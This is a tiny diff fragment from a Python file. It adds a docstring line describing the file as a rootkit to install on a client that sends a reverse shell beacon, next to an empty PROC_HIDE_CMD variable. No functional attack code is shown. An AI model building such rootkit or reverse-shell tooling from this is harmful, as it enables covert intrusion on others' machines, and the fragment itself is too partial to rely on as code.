@@ -6,6 +6,7 @@ from random import choice
 from time import sleep
 
 """
+rootkit to install on client and sends a reverse shell beacon
 """
 
 PROC_HIDE_CMD = f''
